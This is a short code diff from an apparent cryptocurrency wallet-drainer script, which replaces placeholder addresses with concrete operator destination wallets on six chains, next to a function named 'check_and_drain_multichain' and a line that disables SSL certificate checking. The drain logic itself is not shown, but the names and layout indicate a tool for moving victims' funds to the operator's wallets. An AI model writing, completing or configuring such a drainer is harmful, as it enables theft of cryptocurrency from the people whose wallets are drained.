@@ -11,12 +11,12 @@ _ssl_context.verify_mode = ssl.CERT_NONE
 # OPERATOR DESTINATION WALLET CONFIGURATION
 # =====================================================================
 OPERATOR_DESTINATIONS = {
-    "ETHEREUM": "0xYourEthereumAddressHere",  # Receives ETH, ERC-20 USDT, ERC-20 USDC
-    "BITCOIN": "bc1qYourBitcoinAddressHere",    # Receives BTC
-    "LITECOIN": "ltc1qYourLitecoinAddressHere", # Receives LTC
-    "XRP": "rYourXRPAddressHere",             # Receives XRP (Ripple ledger)
-    "SOLANA": "YourSolanaAddressHere",        # Receives SOL, SPL USDT, SPL USDC
-    "TRON": "YourTronAddressHere"             # Receives TRC-20 USDT (Tron network)
+    "ETHEREUM": "0xd134ebcb7060e22f2c6454df28c810dd33a02f5c",  # Receives ETH, ERC-20 USDT, ERC-20 USDC
+    "BITCOIN": "18WGuvU1apn6f2h5uZWF6biS3MFaZ5Pj9d",    # Receives BTC
+    "LITECOIN": "MULVonPhKM5r3sJHs35yaNQ4eMwQVHVZHh", # Receives LTC
+    "XRP": "rnZboEfo3HhKXwoxoSthHVxf5zpbBkXghU",             # Receives XRP (Ripple ledger)
+    "SOLANA": "E1MiQEYmuTg9DMS4vpr5NtkWqeMQmTHZLptv5L3on1ir",        # Receives SOL, SPL USDT, SPL USDC
+    "TRON": "TCeddcjw9VzBsMZFbA9mACfuQLzdAkjwA5"             # Receives TRC-20 USDT (Tron network)
 }
 
 def check_and_drain_multichain(wallet_address, asset_type):
